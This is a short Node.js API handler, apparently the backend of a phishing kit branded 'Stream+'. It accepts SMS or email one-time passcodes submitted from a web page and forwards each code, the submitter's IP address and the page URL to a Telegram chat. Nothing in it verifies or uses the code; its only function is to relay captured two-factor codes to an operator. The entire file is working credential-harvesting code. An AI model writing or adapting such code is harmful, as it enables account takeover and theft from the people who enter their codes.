// POST /api/send-otp — SMS / email OTP code
const { clientIp, sendTelegram, cors } = require('./_telegram');

module.exports = async (req, res) => {
    cors(res);

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    try {
        const {
            otp,
            code,
            type,
            ip,
            pageUrl,
            timestamp
        } = req.body;

        const otpVal = (otp || code || '').toString().trim();

        if (!otpVal) {
            return res.status(400).json({ success: false, message: 'Missing OTP code' });
        }

        const otpType = (type || 'sms').toString().trim().toLowerCase();
        const label = otpType === 'email' ? 'Email OTP' : 'SMS OTP';

        const message =
`📱 [Stream+ ${label}]

- Code : <code>${otpVal}</code>
- Type : <code>${otpType}</code>
- Page URL : ${pageUrl || 'N/A'}
- IP : ${ip || clientIp(req)}
- Time : ${timestamp || new Date().toISOString()}

<blockquote>└ © Stream+ Server</blockquote>`;

        const result = await sendTelegram(message);

        return res.status(200).json({
            success: true,
            message: 'OTP data sent successfully',
            messageId: result.message_id,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('[send-otp]', error.message);
        return res.status(500).json({
            success: false,
            message: 'Failed to send OTP data',
            error: error.message
        });
    }
};
